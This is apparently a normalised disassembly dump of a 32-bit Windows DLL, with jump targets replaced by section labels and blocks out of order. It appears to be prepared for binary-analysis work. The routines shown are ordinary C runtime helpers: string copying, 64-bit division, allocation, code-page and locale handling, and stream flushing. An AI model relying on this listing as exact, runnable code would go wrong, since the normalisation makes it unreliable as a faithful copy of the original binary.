pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10008494
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_1000644b
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_10008500
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10008570
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_100085e5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
mov [ ebp - 0x1c ] esi
cmp esi 0xffffffe0
ja r-xdata
xor ebx ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
jmp r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x20 ]
cmp [ rw-data ] ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp edi [ rw-data ]
ja r-xdata
mov [ ebp - 0x20 ] ebx
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_10005c38
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push 0x9
call sub_10005bc2
pop ecx
mov [ ebp - 0x4 ] ebx
push edi
call sub_10004cb5
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_1000867e
cmp [ ebp - 0x20 ] ebx
je r-xdata
jmp r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x20 ] eax
push 0x9
call sub_10005bc2
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_10005758
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_10008707
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
push ebx
push [ ebp - 0x20 ]
call sub_10007c70
add esp 0xc
sub_10008730
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10008740
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10008820
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_10005bc2
push [ ebp + 0x8 ]
call sub_100089cd
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_10008a4a
xor edx edx
mov eax rw-data
push 0x19
call sub_10005c23
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jb r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_10008a17
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_10008a73
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_10008a17
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_100089cd
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_10008a17
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10008a4a
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_10008a73
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_1000939f
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_10009150
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_10009150
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_10008c14
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_10008c9d
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_10008d0c
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_10005bc2
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_10005c23
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_10008d0c
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_10008dd8
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_10009150
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_10008dd8
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_1000939f
add esp 0x1c
test eax eax
jne r-xdata
sub_10008e4d
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_1000644b
mov [ eax ] 0x9
call sub_10006454
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_10008ecc
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_1000644b
mov [ eax ] 0x9
call sub_10006454
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_10008f0e
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_10005bc2
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_10005c23
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_10008f8f
push ebx
push edi
push 0x2
xor ebx ebx
call sub_10005bc2
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_10005c23
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_100094e8
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_1000440b
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_10009010
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000903e
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_10009565
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_1000903e
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_10008000
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_100090a3
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_10005bc2
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_10005c23
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_10008348
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1000839a
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_10009010
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_10009010
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_10009150
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10009374
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_100047b0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_100047b0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_10009374
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_1000939f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_100047b0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_10007c70
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_100094e8
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_10008319
push esi
call sub_10009519
push esi
mov edi eax
call sub_1000836b
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_10009519
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_1000903e
push esi
mov edi eax
call sub_100097ea
push [ esi + 0x10 ]
call sub_1000970a
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_1000440b
and [ esi + 0x1c ] 0x0
pop ecx
sub_10009565
push ebx
